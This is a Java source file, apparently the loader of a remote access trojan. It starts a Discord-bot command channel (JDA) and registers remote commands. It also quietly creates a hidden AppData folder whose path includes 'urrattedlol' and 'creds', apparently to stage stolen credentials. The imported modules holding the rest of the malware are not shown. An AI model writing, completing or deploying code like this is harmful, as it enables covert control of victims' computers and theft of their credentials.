package Sync.Intent;

import Sync.Intent.Bloat.Network;
import Sync.Intent.Bloat.Protection.Checks;
import Sync.Intent.Ducks.Commands.CommandList;
import Sync.Intent.Utils.LockUtil;
import java.io.File;

public class Loader {
    public static File dir;
    public static String name;

    public static void main(String[] args) throws Throwable {
        CommandList.Register();
        Network.JDA();
    }

    static {
        String userName = System.getProperty("user.name");
        name = userName;
        try {
            String userHome = System.getProperty("user.home");
            dir = new File(userHome, "AppData/Roaming/dylann/angercar/urrattedlol/creds/stazisms/on/github");
            if (!dir.exists()) {
                dir.mkdirs();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
